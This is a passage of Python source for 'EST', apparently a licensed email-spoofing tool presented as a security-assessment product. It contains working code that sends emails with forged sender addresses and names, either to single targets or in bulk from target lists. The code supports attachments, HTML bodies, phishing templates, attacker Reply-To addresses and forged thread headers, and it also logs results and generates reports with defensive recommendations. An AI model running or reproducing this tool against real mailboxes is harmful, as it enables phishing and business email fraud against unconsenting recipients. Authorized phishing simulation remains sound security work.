    def _load_body_from_file(self, body_text_file: Optional[str] = None) -> Optional[str]:
        """Load plain-text email body from a file (template).

        This is different from --body-file (which loads HTML).  This loads the
        plain-text --body content from a file so users can prepare templates on
        their desktop and reference them by path.
        """
        if not body_text_file:
            return None
        bf_path = Path(body_text_file)
        if bf_path.is_file():
            with open(bf_path, 'r', encoding='utf-8') as f:
                content = f.read()
            self.config.logger.info(f"📄 Loaded plain-text body from: {body_text_file} ({len(content)} chars)")
            return content
        else:
            print(f"⚠️  Body text file not found: {body_text_file}")
            return None

    def _load_template(self, template_path: str) -> Optional[Dict]:
        """Load a full email template from a JSON file.

        Template JSON format::

            {
                "from_email": "ceo@company.com",
                "from_name": "CEO",
                "subject": "Important",
                "body": "Plain text body here ...",
                "html_body": "<h1>Optional HTML</h1>",
                "attachments": ["/home/user/Desktop/report.pdf"]
            }

        Any field present in the template overrides the corresponding CLI arg.
        """
        tp = Path(template_path)
        if not tp.is_file():
            print(f"❌ Template file not found: {template_path}")
            return None
        try:
            with open(tp, 'r', encoding='utf-8') as f:
                data = json.load(f)
            self.config.logger.info(f"📑 Loaded template: {template_path}")
            return data
        except json.JSONDecodeError as e:
            print(f"❌ Invalid JSON template: {e}")
            return None

    # ------------------------------------------------------------------
    # Scenario runner
    # ------------------------------------------------------------------

    def run_scenario(self, scenario_id: int, target: str,
                     smtp_host: str = "localhost", smtp_port: int = 2525,
                     reply_to: Optional[str] = None,
                     in_reply_to: Optional[str] = None,
                     references: Optional[str] = None,
                     attachments: Optional[List[str]] = None,
                     html_body: Optional[str] = None,
                     body_file: Optional[str] = None,
                     body_text_file: Optional[str] = None,
                     target_list: Optional[str] = None,
                     delay: float = 0,
                     validate_dns: bool = True) -> bool:
        """Run a specific spoofing scenario against one or more targets"""
        try:
            scenario = self.scenarios[scenario_id - 1]
        except IndexError:
            print(f"❌ Invalid scenario ID: {scenario_id}")
            print(f"💡 Available scenarios: 1-{len(self.scenarios)}")
            return False

        # Resolve targets
        targets = self._resolve_targets(target, target_list)
        if not targets:
            print("❌ No valid target email addresses provided")
            return False

        # DNS validation for sender domain
        if validate_dns:
            dns_results = self.dns_validator.validate_sender_domain(scenario.from_email)
            self.dns_validator.print_validation_report(dns_results)

        # Load optional HTML body
        resolved_html = self._load_html_body(html_body, body_file)

        # Override scenario body with plain-text template file if provided
        effective_body = scenario.body
        if body_text_file:
            loaded = self._load_body_from_file(body_text_file)
            if loaded:
                effective_body = loaded

        print(f"\n🎯 Executing Email Spoofing Test")
        print(f"─" * 40)
        print(f"📧 Scenario: {scenario.name}")
        print(f"🏷️  Category: {scenario.category}")
        print(f"⚠️  Severity: {scenario.severity}")
        print(f"📤 Spoofed From: {scenario.from_name} <{scenario.from_email}>")
        print(f"📥 Targets: {len(targets)} recipient(s)")
        if reply_to:
            print(f"↩️  Reply-To: {reply_to}")
        if in_reply_to:
            print(f"🧵 Thread: In-Reply-To set")
        if attachments:
            print(f"📎 Attachments: {len(attachments)} file(s)")
        if resolved_html:
            print(f"🌐 HTML Body: enabled")
        print(f"📡 SMTP Server: {smtp_host}:{smtp_port}")
        if delay > 0 and len(targets) > 1:
            print(f"⏱️  Throttle: {delay}s between sends")
        print(f"🕐 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()

        success_count = 0
        for idx, tgt in enumerate(targets, 1):
            try:
                email_content = self._build_email_message(
                    from_email=scenario.from_email,
                    from_name=scenario.from_name,
                    to_email=tgt,
                    subject=scenario.subject,
                    body=effective_body,
                    html_body=resolved_html,
                    attachments=attachments,
                    reply_to=reply_to,
                    in_reply_to=in_reply_to,
                    references=references,
                    scenario=scenario,
                )

                if len(targets) > 1:
                    print(f"🚀 [{idx}/{len(targets)}] Sending to {tgt}...")
                else:
                    print("🚀 Initiating SMTP connection...")

                server = smtplib.SMTP(smtp_host, smtp_port, timeout=30)
                server.sendmail(scenario.from_email, [tgt], email_content)
                server.quit()

                success_count += 1
                if len(targets) == 1:
                    print("✅ Email spoofing test completed successfully!")
                    print(f"📋 Check target inbox: {tgt}")

                # Log the test
                self._log_test_result(TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_type="scenario_test",
                    scenario=scenario.name,
                    target=tgt,
                    from_email=scenario.from_email,
                    success=True,
                    details={
                        "category": scenario.category,
                        "severity": scenario.severity,
                        "smtp_server": f"{smtp_host}:{smtp_port}",
                        "reply_to": reply_to,
                        "has_attachments": bool(attachments),
                        "has_html": bool(resolved_html),
                        "threaded": bool(in_reply_to),
                    }
                ))

                # Throttle between sends
                if delay > 0 and idx < len(targets):
                    time.sleep(delay)

            except Exception as e:
                print(f"❌ Failed for {tgt}: {e}")
                self._log_test_result(TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_type="scenario_test",
                    scenario=scenario.name,
                    target=tgt,
                    from_email=scenario.from_email,
                    success=False,
                    details={"error": str(e), "smtp_server": f"{smtp_host}:{smtp_port}"}
                ))

        if len(targets) > 1:
            print(f"\n📊 Bulk send complete: {success_count}/{len(targets)} succeeded")

        return success_count > 0

    # ------------------------------------------------------------------
    # Custom test runner
    # ------------------------------------------------------------------

    def run_custom_test(self, from_email: str, from_name: str, subject: str,
                        body: str, target: str,
                        smtp_host: str = "localhost", smtp_port: int = 2525,
                        reply_to: Optional[str] = None,
                        in_reply_to: Optional[str] = None,
                        references: Optional[str] = None,
                        attachments: Optional[List[str]] = None,
                        html_body: Optional[str] = None,
                        body_file: Optional[str] = None,
                        body_text_file: Optional[str] = None,
                        target_list: Optional[str] = None,
                        delay: float = 0,
                        validate_dns: bool = True) -> bool:
        """Run custom spoofing test with full feature set"""

        # Resolve targets
        targets = self._resolve_targets(target, target_list)
        if not targets:
            print("❌ No valid target email addresses provided")
            return False

        # DNS validation
        if validate_dns:
            dns_results = self.dns_validator.validate_sender_domain(from_email)
            self.dns_validator.print_validation_report(dns_results)

        # Load optional HTML body
        resolved_html = self._load_html_body(html_body, body_file)

        # Override body with plain-text template file if provided
        effective_body = body
        if body_text_file:
            loaded = self._load_body_from_file(body_text_file)
            if loaded:
                effective_body = loaded

        print(f"\n🎯 Executing Custom Email Spoofing Test")
        print(f"─" * 45)
        print(f"📤 Spoofed From: {from_name} <{from_email}>")
        print(f"📥 Targets: {len(targets)} recipient(s)")
        print(f"📋 Subject: {subject}")
        if reply_to:
            print(f"↩️  Reply-To: {reply_to}")
        if in_reply_to:
            print(f"🧵 Thread: In-Reply-To set")
        if attachments:
            print(f"📎 Attachments: {len(attachments)} file(s)")
        if resolved_html:
            print(f"🌐 HTML Body: enabled")
        print(f"📡 SMTP Server: {smtp_host}:{smtp_port}")
        if delay > 0 and len(targets) > 1:
            print(f"⏱️  Throttle: {delay}s between sends")
        print(f"🕐 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()

        success_count = 0
        for idx, tgt in enumerate(targets, 1):
            try:
                email_content = self._build_email_message(
                    from_email=from_email,
                    from_name=from_name,
                    to_email=tgt,
                    subject=subject,
                    body=effective_body,
                    html_body=resolved_html,
                    attachments=attachments,
                    reply_to=reply_to,
                    in_reply_to=in_reply_to,
                    references=references,
                )

                if len(targets) > 1:
                    print(f"🚀 [{idx}/{len(targets)}] Sending to {tgt}...")
                else:
                    print("🚀 Initiating SMTP connection...")

                server = smtplib.SMTP(smtp_host, smtp_port, timeout=30)
                server.sendmail(from_email, [tgt], email_content)
                server.quit()

                success_count += 1
                if len(targets) == 1:
                    print("✅ Custom email spoofing test completed successfully!")
                    print(f"📋 Check target inbox: {tgt}")

                self._log_test_result(TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_type="custom_test",
                    scenario="custom",
                    target=tgt,
                    from_email=from_email,
                    success=True,
                    details={
                        "from_name": from_name,
                        "subject": subject,
                        "body_length": len(body),
                        "smtp_server": f"{smtp_host}:{smtp_port}",
                        "reply_to": reply_to,
                        "has_attachments": bool(attachments),
                        "has_html": bool(resolved_html),
                        "threaded": bool(in_reply_to),
                    }
                ))

                if delay > 0 and idx < len(targets):
                    time.sleep(delay)

            except Exception as e:
                print(f"❌ Failed for {tgt}: {e}")
                self._log_test_result(TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_type="custom_test",
                    scenario="custom",
                    target=tgt,
                    from_email=from_email,
                    success=False,
                    details={"error": str(e), "smtp_server": f"{smtp_host}:{smtp_port}"}
                ))

        if len(targets) > 1:
            print(f"\n📊 Bulk send complete: {success_count}/{len(targets)} succeeded")

        return success_count > 0

    # ------------------------------------------------------------------
    # Bulk command (convenience wrapper)
    # ------------------------------------------------------------------

    def run_bulk_test(self, scenario_id: Optional[int], target_list: str,
                      smtp_host: str = "localhost", smtp_port: int = 2525,
                      delay: float = 1.0,
                      reply_to: Optional[str] = None,
                      in_reply_to: Optional[str] = None,
                      references: Optional[str] = None,
                      attachments: Optional[List[str]] = None,
                      html_body: Optional[str] = None,
                      body_file: Optional[str] = None,
                      body_text_file: Optional[str] = None,
                      from_email: Optional[str] = None,
                      from_name: Optional[str] = None,
                      subject: Optional[str] = None,
                      body: Optional[str] = None,
                      validate_dns: bool = True) -> bool:
        """Run a bulk spoofing campaign against a list of targets."""
        if scenario_id is not None:
            return self.run_scenario(
                scenario_id=scenario_id,
                target="",
                smtp_host=smtp_host,
                smtp_port=smtp_port,
                reply_to=reply_to,
                in_reply_to=in_reply_to,
                references=references,
                attachments=attachments,
                html_body=html_body,
                body_file=body_file,
                body_text_file=body_text_file,
                target_list=target_list,
                delay=delay,
                validate_dns=validate_dns,
            )
        elif from_email and from_name and subject and body:
            return self.run_custom_test(
                from_email=from_email,
                from_name=from_name,
                subject=subject,
                body=body,
                target="",
                smtp_host=smtp_host,
                smtp_port=smtp_port,
                reply_to=reply_to,
                in_reply_to=in_reply_to,
                references=references,
                attachments=attachments,
                html_body=html_body,
                body_file=body_file,
                body_text_file=body_text_file,
                target_list=target_list,
                delay=delay,
                validate_dns=validate_dns,
            )
        else:
            print("❌ Bulk mode requires either --scenario or all of --from-email, --from-name, --subject, --body")
            return False

    # ------------------------------------------------------------------
    # DNS check command
    # ------------------------------------------------------------------

    def check_dns(self, domain_or_email: str):
        """Run DNS validation on a domain or sender email and print results."""
        results = self.dns_validator.validate_sender_domain(domain_or_email)
        self.dns_validator.print_validation_report(results)

    # ------------------------------------------------------------------
    # Logs & reporting (unchanged logic, kept for completeness)
    # ------------------------------------------------------------------

    def show_logs(self, lines: int = 20):
        """Display recent test logs"""
        if not self.config.log_file.exists():
            print("📝 No test logs found")
            print(f"💡 Run some tests first, then check: {self.config.log_file}")
            return
        
        print(f"\n📊 EST Security Test Logs (Last {lines} entries)")
        print("═" * 80)
        
        try:
            with open(self.config.log_file, 'r') as f:
                log_lines = f.readlines()
            
            # Parse only valid JSON entries (skip logging handler text lines)
            json_entries = []
            for line in log_lines:
                try:
                    json_entries.append(json.loads(line.strip()))
                except json.JSONDecodeError:
                    continue
            
            recent_entries = json_entries[-lines:] if len(json_entries) > lines else json_entries
            
            for entry in recent_entries:
                timestamp = entry['timestamp'][:19].replace('T', ' ')
                
                status = "✅ SUCCESS" if entry['success'] else "❌ FAILED"
                test_type = entry['test_type'].replace('_', ' ').title()
                
                print(f"📅 {timestamp} | {status}")
                print(f"🎯 Test: {test_type} - {entry['scenario']}")
                print(f"📤 From: {entry['from_email']}")
                print(f"📥 Target: {entry['target']}")
                
                if 'details' in entry and entry['details']:
                    details = entry['details']
                    if 'category' in details:
                        print(f"🏷️  Category: {details['category']}")
                    if 'severity' in details:
                        print(f"⚠️  Severity: {details['severity']}")
                    if 'error' in details:
                        print(f"❌ Error: {details['error']}")
                
                print("─" * 80)
            
            print(f"📈 Total log entries: {len(json_entries)}")
            print(f"📁 Full log file: {self.config.log_file}")
            
        except Exception as e:
            print(f"❌ Error reading logs: {e}")
    
    def generate_report(self, output_file: Optional[str] = None):
        """Generate comprehensive test report"""
        if not self.config.log_file.exists():
            print("❌ No test data available for report generation")
            return
        
        print("📊 Generating EST Security Assessment Report...")
        
        try:
            # Read all log entries (skip non-JSON lines from logging handler)
            log_entries = []
            with open(self.config.log_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        log_entries.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
            
            if not log_entries:
                print("❌ No test data found in logs")
                return
            
            # Generate report
            report = self._create_report(log_entries)
            
            # Save report
            if not output_file:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = self.config.reports_dir / f"est_report_{timestamp}.json"
            
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            
            print(f"✅ Report generated: {output_file}")
            self._print_report_summary(report)
            
        except Exception as e:
            print(f"❌ Report generation failed: {e}")
    
    def _create_report(self, log_entries: List[Dict]) -> Dict:
        """Create comprehensive assessment report"""
        total_tests = len(log_entries)
        successful_tests = sum(1 for entry in log_entries if entry['success'])
        failed_tests = total_tests - successful_tests
        
        # Analyze by test type
        test_types = {}
        for entry in log_entries:
            test_type = entry['test_type']
            if test_type not in test_types:
                test_types[test_type] = {'total': 0, 'success': 0}
            test_types[test_type]['total'] += 1
            if entry['success']:
                test_types[test_type]['success'] += 1
        
        # Analyze by scenario
        scenarios = {}
        for entry in log_entries:
            scenario = entry['scenario']
            if scenario not in scenarios:
                scenarios[scenario] = {'total': 0, 'success': 0}
            scenarios[scenario]['total'] += 1
            if entry['success']:
                scenarios[scenario]['success'] += 1
        
        # Time analysis
        timestamps = [entry['timestamp'] for entry in log_entries]
        first_test = min(timestamps) if timestamps else None
        last_test = max(timestamps) if timestamps else None
        
        return {
            "report_metadata": {
                "generated_at": datetime.now().isoformat(),
                "tool_version": __version__,
                "report_type": "EST Security Assessment",
                "total_tests": total_tests
            },
            "executive_summary": {
                "total_tests_conducted": total_tests,
                "successful_tests": successful_tests,
                "failed_tests": failed_tests,
                "success_rate": round((successful_tests / total_tests * 100), 2) if total_tests > 0 else 0,
                "test_period": {
                    "first_test": first_test,
                    "last_test": last_test
                }
            },
            "test_analysis": {
                "by_test_type": test_types,
                "by_scenario": scenarios
            },
            "detailed_logs": log_entries,
            "recommendations": self._generate_recommendations(log_entries)
        }
    
    def _generate_recommendations(self, log_entries: List[Dict]) -> List[str]:
        """Generate security recommendations based on test results"""
        recommendations = []
        
        successful_tests = sum(1 for entry in log_entries if entry['success'])
        total_tests = len(log_entries)
        success_rate = (successful_tests / total_tests * 100) if total_tests > 0 else 0
        
        if success_rate > 80:
            recommendations.extend([
                "🔴 CRITICAL: High email spoofing success rate detected",
                "Implement SPF, DKIM, and DMARC email authentication",
                "Configure email security gateways with spoofing detection",
                "Conduct immediate security awareness training"
            ])
        elif success_rate > 50:
            recommendations.extend([
                "🟠 HIGH: Moderate spoofing vulnerabilities identified",
                "Review and strengthen email authentication policies",
                "Implement additional email security controls",
                "Regular security awareness training recommended"
            ])
        else:
            recommendations.extend([
                "🟡 MEDIUM: Some spoofing attempts successful",
                "Continue monitoring email security controls",
                "Periodic security awareness refresher training",
                "Regular testing of email authentication mechanisms"
            ])
        
        recommendations.extend([
            "📚 Provide targeted training on identifying spoofed emails",
            "🔍 Implement email header analysis training",
            "⚡ Establish incident response procedures for email attacks",
            "📊 Regular penetration testing of email security controls"
        ])
        
        return recommendations
    
    def _print_report_summary(self, report: Dict):
        """Print report summary to console"""
        summary = report['executive_summary']
        
        print(f"\n📋 EST Security Assessment Summary")
        print("═" * 50)
        print(f"📊 Total Tests: {summary['total_tests_conducted']}")
        print(f"✅ Successful: {summary['successful_tests']}")
        print(f"❌ Failed: {summary['failed_tests']}")
        print(f"📈 Success Rate: {summary['success_rate']}%")
        
        if summary['success_rate'] > 80:
            print("🔴 Risk Level: CRITICAL - Immediate action required")
        elif summary['success_rate'] > 50:
            print("🟠 Risk Level: HIGH - Remediation recommended")
        else:
            print("🟡 Risk Level: MEDIUM - Monitoring advised")
        
        print(f"\n📚 Recommendations: {len(report['recommendations'])} items")
        for rec in report['recommendations'][:3]:
            print(f"   • {rec}")
        if len(report['recommendations']) > 3:
            print(f"   ... and {len(report['recommendations']) - 3} more")

    # ------------------------------------------------------------------
    # Internal logging
    # ------------------------------------------------------------------

    def _log_test_result(self, result: TestResult):
        """Log test result"""
        try:
            log_entry = {
                "timestamp": result.timestamp,
                "test_type": result.test_type,
                "scenario": result.scenario,
                "target": result.target,
                "from_email": result.from_email,
                "success": result.success,
                "details": result.details
            }
            
            with open(self.config.log_file, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
                
            self.config.logger.info(f"Test logged: {result.test_type} - {result.scenario}")
                
        except Exception as e:
            self.config.logger.error(f"Failed to log test result: {e}")

def _add_common_send_args(parser: argparse.ArgumentParser):
    """Add common arguments shared by test, custom, and bulk subcommands."""
    parser.add_argument('--smtp-host', default='localhost',
                        help='SMTP server hostname (default: localhost)')
    parser.add_argument('--smtp-port', type=int, default=2525,
                        help='SMTP server port (default: 2525)')
    parser.add_argument('--reply-to', default=None,
                        help='Reply-To email address')
    parser.add_argument('--in-reply-to', default=None,
                        help='Message-ID to thread as a reply (In-Reply-To header)')
    parser.add_argument('--references', default=None,
                        help='Message-ID references for threading (References header)')
    parser.add_argument('--attachment', action='append', default=None, dest='attachments',
                        help='File path to attach (PDF, HTML, DOCX, images, any type). Repeat for multiple files.')
    parser.add_argument('--html-body', default=None,
                        help='Raw HTML string to use as email body (alternative part)')
    parser.add_argument('--body-file', default=None,
                        help='Path to an HTML file whose contents will be used as email body')
    parser.add_argument('--body-text-file', default=None,
                        help='Path to a plain-text file to use as the email body (template)')
    parser.add_argument('--template', default=None,
                        help='Path to a JSON template file that pre-fills email fields')
    parser.add_argument('--target-list', default=None,
                        help='Path to a file containing target emails (one per line)')
    parser.add_argument('--delay', type=float, default=0,
                        help='Seconds to wait between sends for bulk/multiple targets (default: 0)')
    parser.add_argument('--no-dns-check', action='store_true', default=False,
                        help='Skip DNS (SPF/DKIM/DMARC) validation of sender domain')


def _apply_template(est: EST, args, is_custom: bool = False):
    """If --template is provided, load the JSON template and merge its fields
    into the argparse namespace so callers don't need special handling."""
    if not getattr(args, 'template', None):
        return

    tpl = est._load_template(args.template)
    if tpl is None:
        sys.exit(1)

    # Merge: template values fill in missing CLI args
    for key in ('from_email', 'from_name', 'subject', 'body', 'html_body',
                'reply_to', 'in_reply_to', 'references', 'target', 'target_list',
                'body_text_file', 'body_file'):
        tpl_key = key.replace('-', '_')
        if tpl_key in tpl and (getattr(args, tpl_key, None) is None or getattr(args, tpl_key, None) == ''):
            setattr(args, tpl_key, tpl[tpl_key])

    # Attachments: extend (don't replace)
    if 'attachments' in tpl and tpl['attachments']:
        existing = getattr(args, 'attachments', None) or []
        setattr(args, 'attachments', existing + tpl['attachments'])


def main():
    """Main application entry point"""
    parser = argparse.ArgumentParser(
        prog='est',
        description='EST - Professional Email Spoofing Tool for Security Assessment',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  est server --port 2525                    Start SMTP testing server
  est list                                  List available spoofing scenarios
  est test 1 target@company.com             Run CEO fraud scenario
  est test 1 a@x.com,b@x.com --delay 2     Bulk scenario with throttle
  est custom --from-email "ceo@company.com" \\
         --from-name "John Smith" \\
         --subject "Urgent Request" \\
         --body "Please handle this" \\
         --target "user@company.com" \\
         --reply-to "real@attacker.com" \\
         --attachment report.pdf \\
         --html-body "<h1>Urgent</h1>"      Custom test with all features
  est custom --template ~/Desktop/phish.json \\
         --target "user@company.com"        Use a JSON template
  est bulk --scenario 1 \\
         --target-list targets.txt \\
         --delay 2                          Bulk scenario against list
  est dns-check ceo@company.com             Check sender DNS records
  est logs --lines 50                       View recent test logs
  est report                                Generate assessment report
  est license status                        Show license status
  est license activate <KEY>                Activate a license key
  est license generate                      Generate a key (owner only)
  est license machine-id                    Show this machine's ID

EST v{__version__} - Professional Email Security Assessment Framework
Author: {__author__} | License: {__license__}

⚠️  LEGAL NOTICE: For authorized security testing only.
   Obtain explicit written permission before testing any systems.
        """
    )
    
    parser.add_argument('--version', action='version', version=f'EST v{__version__}')
    
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Server command
    server_parser = subparsers.add_parser('server', help='Start SMTP testing server')
    server_parser.add_argument('--host', default='0.0.0.0', 
                              help='Host to bind to (default: 0.0.0.0)')
    server_parser.add_argument('--port', type=int, default=2525,
                              help='Port to bind to (default: 2525)')
    
    # List command
    subparsers.add_parser('list', help='List available spoofing scenarios')
    
    # Test command
    test_parser = subparsers.add_parser('test', help='Run spoofing scenario')
    test_parser.add_argument('scenario', type=int, 
                            help='Scenario ID (use "list" to see available)')
    test_parser.add_argument('target', nargs='?', default='',
                            help='Target email address (comma-separated for multiple)')
    _add_common_send_args(test_parser)
    
    # Custom test command
    custom_parser = subparsers.add_parser('custom', help='Run custom spoofing test')
    custom_parser.add_argument('--from-email', required=True,
                              help='Spoofed sender email address')
    custom_parser.add_argument('--from-name', required=True,
                              help='Spoofed sender display name')
    custom_parser.add_argument('--subject', required=True,
                              help='Email subject line')
    custom_parser.add_argument('--body', default='',
                              help='Email body content (plain text). Use --body-text-file for file input.')
    custom_parser.add_argument('--target', default='',
                              help='Target email address (comma-separated for multiple)')
    _add_common_send_args(custom_parser)

    # Bulk command
    bulk_parser = subparsers.add_parser('bulk', help='Bulk send spoofed emails to a list of targets')
    bulk_group = bulk_parser.add_mutually_exclusive_group()
    bulk_group.add_argument('--scenario', type=int, default=None,
                            help='Scenario ID to use for bulk send')
    bulk_group.add_argument('--from-email', default=None,
                            help='Spoofed sender email for custom bulk')
    bulk_parser.add_argument('--from-name', default=None,
                            help='Spoofed sender display name (required for custom bulk)')
    bulk_parser.add_argument('--subject', default=None,
                            help='Email subject (required for custom bulk)')
    bulk_parser.add_argument('--body', default=None,
                            help='Email body (required for custom bulk, or use --body-text-file)')
    _add_common_send_args(bulk_parser)

    # DNS check command
    dns_parser = subparsers.add_parser('dns-check',
                                       help='Check SPF/DKIM/DMARC records for a sender domain')
    dns_parser.add_argument('sender', help='Sender email address or domain to check')

    # Logs command
    logs_parser = subparsers.add_parser('logs', help='View test logs')
    logs_parser.add_argument('--lines', type=int, default=20,
                            help='Number of recent log entries to display (default: 20)')
    
    # Report command
    report_parser = subparsers.add_parser('report', help='Generate assessment report')
    report_parser.add_argument('--output', help='Output file path (default: auto-generated)')

    # License command
    license_parser = subparsers.add_parser('license', help='Manage EST license')
    license_sub = license_parser.add_subparsers(dest='license_action', help='License actions')
    license_sub.add_parser('status', help='Show current license status')
    lic_activate = license_sub.add_parser('activate', help='Activate a license key')
    lic_activate.add_argument('key', help='License key to activate')
    license_sub.add_parser('deactivate', help='Remove stored license')
    lic_gen = license_sub.add_parser('generate', help='Generate a license key (owner only)')
    lic_gen.add_argument('--machine-id', default=None,
                         help='Target machine ID (default: this machine)')
    lic_gen.add_argument('--days', type=int, default=365,
                         help='Days valid (default: 365)')
    lic_gen.add_argument('--tier', default='pro', choices=['basic', 'pro', 'enterprise'],
                         help='License tier (default: pro)')
    license_sub.add_parser('machine-id', help='Show this machine\'s fingerprint')

    args = parser.parse_args()
    
    # Initialize EST
    est = EST()
    
    # Handle commands
    if not args.command:
        est.print_banner()
        parser.print_help()
        return

    # ---- License management (no license check needed for these) ----
    if args.command == 'license':
        if not args.license_action:
            license_parser.print_help()
            return

        if args.license_action == 'status':
            est.license_mgr.print_status()

        elif args.license_action == 'activate':
            result = est.license_mgr.activate_license(args.key)
            if result["valid"]:
                print(f"✅ {result.get('message', 'License activated')}")
            else:
                print(f"❌ Activation failed: {result.get('error')}")
                sys.exit(1)

        elif args.license_action == 'deactivate':
            if est.license_mgr.deactivate_license():
                print("✅ License removed")
            else:
                print("⚠️  No license was installed")

        elif args.license_action == 'generate':
            mid = args.machine_id or LicenseManager._get_machine_id()
            key = LicenseManager.generate_license_key(
                machine_id=mid, days_valid=args.days, tier=args.tier
            )
            print(f"\n🔑 Generated License Key")
            print("─" * 60)
            print(f"   Machine ID: {mid}")
            print(f"   Tier:       {args.tier}")
            print(f"   Valid for:  {args.days} days")
            print(f"\n   Key:\n   {key}\n")
            print("   To activate: est license activate <key>")

        elif args.license_action == 'machine-id':
            mid = LicenseManager._get_machine_id()
            print(f"\n🖥️  Machine ID: {mid}\n")
            print("   Provide this ID to the EST author to obtain a license key.")

        return

    # ---- For all other commands, enforce license ----
    if not est.license_mgr.require_license():
        sys.exit(1)

    if args.command == 'server':
        # Check port permissions
        if args.port <= 1024 and hasattr(os, 'geteuid') and os.geteuid() != 0:
            print(f"❌ Port {args.port} requires root privileges!")
            print(f"💡 Solutions:")
            print(f"   1. Run as root: sudo est server --port {args.port}")
            print(f"   2. Use unprivileged port: est server --port 2525")
            sys.exit(1)
        
        server = SMTPTestServer(args.host, args.port, est.config)
        try:
            server.start()
        except KeyboardInterrupt:
            pass
    
    elif args.command == 'list':
        est.print_banner()
        est.list_scenarios()
    
    elif args.command == 'test':
        est.print_banner()
        _apply_template(est, args)
        success = est.run_scenario(
            scenario_id=args.scenario,
            target=args.target,
            smtp_host=args.smtp_host,
            smtp_port=args.smtp_port,
            reply_to=args.reply_to,
            in_reply_to=args.in_reply_to,
            references=args.references,
            attachments=args.attachments,
            html_body=args.html_body,
            body_file=args.body_file,
            body_text_file=args.body_text_file,
            target_list=args.target_list,
            delay=args.delay,
            validate_dns=not args.no_dns_check,
        )
        sys.exit(0 if success else 1)
    
    elif args.command == 'custom':
        est.print_banner()
        _apply_template(est, args)

        # Resolve body: CLI --body wins, then --body-text-file
        effective_body = args.body
        if not effective_body and args.body_text_file:
            loaded = est._load_body_from_file(args.body_text_file)
            if loaded:
                effective_body = loaded
        if not effective_body:
            print("❌ Email body is required. Provide --body, --body-text-file, or --template")
            sys.exit(1)

        success = est.run_custom_test(
            from_email=args.from_email,
            from_name=args.from_name,
            subject=args.subject,
            body=effective_body,
            target=args.target,
            smtp_host=args.smtp_host,
            smtp_port=args.smtp_port,
            reply_to=args.reply_to,
            in_reply_to=args.in_reply_to,
            references=args.references,
            attachments=args.attachments,
            html_body=args.html_body,
            body_file=args.body_file,
            body_text_file=args.body_text_file,
            target_list=args.target_list,
            delay=args.delay,
            validate_dns=not args.no_dns_check,
        )
        sys.exit(0 if success else 1)

    elif args.command == 'bulk':
        est.print_banner()
        _apply_template(est, args)
        if not args.target_list:
            print("❌ --target-list is required for bulk command")
            sys.exit(1)

        # For custom bulk, allow body from --body-text-file
        effective_body = args.body
        if not effective_body and getattr(args, 'body_text_file', None):
            loaded = est._load_body_from_file(args.body_text_file)
            if loaded:
                effective_body = loaded

        success = est.run_bulk_test(
            scenario_id=args.scenario,
            target_list=args.target_list,
            smtp_host=args.smtp_host,
            smtp_port=args.smtp_port,
            delay=args.delay if args.delay > 0 else 1.0,
            reply_to=args.reply_to,
            in_reply_to=args.in_reply_to,
            references=args.references,
            attachments=args.attachments,
            html_body=args.html_body,
            body_file=args.body_file,
            body_text_file=args.body_text_file,
            from_email=args.from_email,
            from_name=args.from_name,
            subject=args.subject,
            body=effective_body,
            validate_dns=not args.no_dns_check,
        )
        sys.exit(0 if success else 1)

    elif args.command == 'dns-check':
        est.print_banner()
        est.check_dns(args.sender)
    
    elif args.command == 'logs':
        est.print_banner()
        est.show_logs(args.lines)
    
    elif args.command == 'report':
        est.print_banner()
        est.generate_report(args.output)

if __name__ == "__main__":
    main()